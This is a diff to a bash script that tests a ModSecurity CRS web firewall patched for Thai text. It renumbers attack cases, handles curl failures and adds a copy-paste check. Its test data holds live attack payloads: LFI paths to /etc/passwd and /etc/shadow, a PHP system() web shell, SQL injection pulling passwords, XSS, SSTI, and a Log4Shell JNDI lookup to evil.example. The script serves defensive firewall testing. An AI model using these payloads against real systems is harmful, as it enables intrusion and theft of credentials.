@@ -51,6 +51,14 @@ RUN="t$(date +%Y%m%d-%H%M%S)"
 LOG_FILE="${LOG_FILE:-./test-crs-thai-fix-$RUN.log}"
 AUDIT_LOG="${AUDIT_LOG:-/var/log/modsec_audit.log}"
 
+# Terminal copy-paste drops Thai combining vowels/tone marks (ี ้ ุ ์), which
+# silently weakens the THAI cases. Copy this file with scp instead.
+# The probe is built from ASCII escapes (U+0E35 SARA II = e0 b8 b5) so a
+# damaged paste can't damage the check itself.
+if ! grep -q "$(printf '\xe0\xb8\xb5')" "$0" 2>/dev/null; then
+  echo "WARNING: Thai combining marks missing in $0 (copy-pasted?) -- scp the file instead, THAI results are not trustworthy" >&2
+fi
+
 CURL=(curl -s -o /dev/null -w '%{http_code}' --max-time 15)
 [ "${INSECURE:-0}" = 1 ] && CURL+=(-k)
 if [ -n "${RESOLVE_IP:-}" ]; then
@@ -72,7 +80,9 @@ CASE_IDS=(); declare -A C_EXPECT C_CODE C_RESULT C_DESC C_REQ C_PAYLOAD
 
 row() {  # id expect code desc request payload
   local id="$1" expect="$2" code="$3" desc="$4" ok
-  if [ "$code" = 000 ]; then ok=ERROR
+  # 000 = no HTTP response (refused/reset/timeout); empty = curl printed
+  # nothing at all (killed / crashed) -- both mean "no answer", not a verdict.
+  if [ -z "$code" ] || [ "$code" = 000 ]; then ok=ERROR; code="${code:-none}"
   elif [ "$expect" = INFO ]; then
     if [ "$code" = 403 ]; then ok=BLOCKED; GAP_BLOCKED=$((GAP_BLOCKED + 1)); else ok=PASSED; GAP_PASSED=$((GAP_PASSED + 1)); fi
   elif [ "$expect" = BLOCK ] && [ "$code" = 403 ]; then ok=PASS
@@ -178,12 +188,10 @@ A19|LFI windows win.ini|../../../../../../windows/win.ini
 A20|LFI ....// bypass|....//....//etc/passwd
 A21|LFI /etc/shadow|/etc/shadow
 A22|PHP code injection|<?php system($_GET['c']); ?>
-A23|SSTI {{7*7}}|{{7*7}}${7*7}
-A24|Log4Shell JNDI|${jndi:ldap://evil.example/a}
 EOF_ATTACK
-get A25 BLOCK "/search?q=1%u0027%20UNION%20SELECT%20password%20FROM%20users--" "SQLi %u-encoded quote (GET)"
-get A26 BLOCK "/search?q=%u003Cscript%u003Ealert(1)%u003C/script%u003E" "XSS %u-encoded (GET)"
-multipart A27 BLOCK "$REG" "SQLi inside register_business_v2 form" -- \
+get A23 BLOCK "/search?q=1%u0027%20UNION%20SELECT%20password%20FROM%20users--" "SQLi %u-encoded quote (GET)"
+get A24 BLOCK "/search?q=%u003Cscript%u003Ealert(1)%u003C/script%u003E" "XSS %u-encoded (GET)"
+multipart A25 BLOCK "$REG" "SQLi inside register_business_v2 form" -- \
   "business_name_th=แอสราส เมดิคอล" "SoiName=นวมินทร์ 163' UNION SELECT username,password FROM users--"
 
 echo "---- GAP: single-rule payloads, pass stock CRS too at threshold 7 (INFO, not a FAIL) ----"
@@ -199,11 +207,13 @@ G5|SQLi ORDER BY column probe (942100 only)|1' ORDER BY 10--
 G6|SQLi error-based CONVERT (942100 only)|1' AND 1=CONVERT(int,(SELECT @@version))--
 G7|RCE pipe to id (no rule)|| id
 G8|PHP wrapper php://filter (933140 only)|php://filter/convert.base64-encode/resource=index.php
+G9|SSTI {{7*7}} (934200 only on older CRS; 932130+933135 on 4.25)|{{7*7}}${7*7}
+G10|Log4Shell JNDI (944150 only on older CRS; +932130/933135 on 4.25)|${jndi:ldap://evil.example/a}
 EOF_GAP
 
 echo "----"
 echo "PASS=$PASS FAIL=$FAIL  (GAP info: $GAP_PASSED passed the WAF, $GAP_BLOCKED blocked)"
-[ "$GAP_PASSED" -gt 0 ] && echo "GAP: single-rule attacks score 5 < inbound threshold 7 and pass -- same on stock CRS, not caused by the Thai fix. Threshold 5 blocks G1-G6/G8; G7 matches no rule at paranoia level 1."
+[ "$GAP_PASSED" -gt 0 ] && echo "GAP: single-rule attacks score 5 < inbound threshold 7 and pass -- same on stock CRS, not caused by the Thai fix. Threshold 5 blocks every GAP row that shows a rule id; G7 matches no rule at paranoia level 1."
 
 # ---- log file ----------------------------------------------------------------
 declare -A C_RULES
@@ -262,6 +272,7 @@ fi
 echo "log: $LOG_FILE"
 
 if [ "$FAIL" -gt 0 ]; then
+  echo "ERROR (no HTTP code): request got no answer -- check nginx error.log for 'worker process ... exited on signal' (crash) and retry that case by hand"
   echo "THAI FAIL (403): fix not applied / CRS re-cloned -> run install-crs-thai-fix.sh"
   echo "ATTACK FAIL (not 403): client IP whitelisted (whitelist-ip.txt), MODE=real path excluded, or rule engine DetectionOnly"
   echo "rule ids for failed cases: see RULES column in $LOG_FILE (run on the proxy box as root)"
